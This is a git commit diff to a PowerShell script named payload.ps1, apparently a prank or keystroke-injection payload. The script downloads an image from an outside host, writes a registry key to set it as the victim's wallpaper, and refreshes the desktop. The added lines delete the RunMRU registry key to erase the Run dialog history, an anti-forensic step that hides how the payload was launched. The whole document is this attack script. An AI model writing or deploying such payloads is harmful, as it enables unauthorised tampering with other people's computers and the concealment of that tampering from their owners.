70325892c2053785184cc10b0fcfe1ae232bc040
X-Force1 <49411153+X-Force1@users.noreply.github.com>
2019-04-08 19:55:07 +0200

    Update payload.ps1

--- payload.ps1
+++ payload.ps1
@@ -2,4 +2,7 @@ $client = new-object System.Net.WebClient
 $client.DownloadFile(\"https://cdn.hipwallpaper.com/i/52/10/xLOrwz.jpg\" , \"hack.jpg\")
 reg add \"HKCU\\Control Panel\\Desktop\" /v WallPaper /d \"%USERPROFILE%\\hack.jpg\" /f
 RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True
+
+//Clear Run
+reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f
 exit
